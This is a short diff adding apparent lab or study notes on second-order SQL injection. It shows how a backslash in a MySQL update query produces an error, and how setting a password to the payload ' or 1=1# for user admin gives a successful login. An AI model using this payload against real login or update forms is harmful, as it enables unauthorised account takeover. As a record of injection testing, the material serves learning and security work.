@@ -1,0 +1,12 @@
+[SECOND ORDER INJECTIONS]
+Update query -error based
+by giving "\" in the update query entry an error in the mysql statement is triggered
+"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1"
+
+username=admin
+update password=' or 1=1#
+no syntax error is created
+when we use single quotes in new password no syntax error is generated.
+update password:' or 1=1#
+username:admin
+successfully logged in
